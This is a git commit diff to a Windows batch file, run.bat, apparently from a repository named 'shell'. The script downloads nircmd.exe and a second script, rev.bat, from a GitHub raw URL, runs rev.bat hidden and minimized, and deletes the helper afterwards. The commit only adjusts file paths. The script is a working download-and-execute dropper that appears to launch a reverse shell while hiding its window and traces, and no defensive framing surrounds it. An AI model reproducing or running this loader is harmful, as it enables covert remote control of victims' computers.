361953e04579872f4f96fb26fe355bbecba1d0c5
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 04:54:10 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,7 @@
 @echo off
-if not exist "%~dp0nircmd.exe" (
-    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o "%~dp0nircmd.exe"
+if not exist "nircmd.exe" (
+    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o nircmd.exe
 )
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
-start /min cmd /c "%~dp0nircmd.exe" exec hide cmd /c rev.bat
-del "%~dp0nircmd.exe"
+start /min cmd /c nircmd.exe exec hide cmd /c rev.bat
+del nircmd.exe
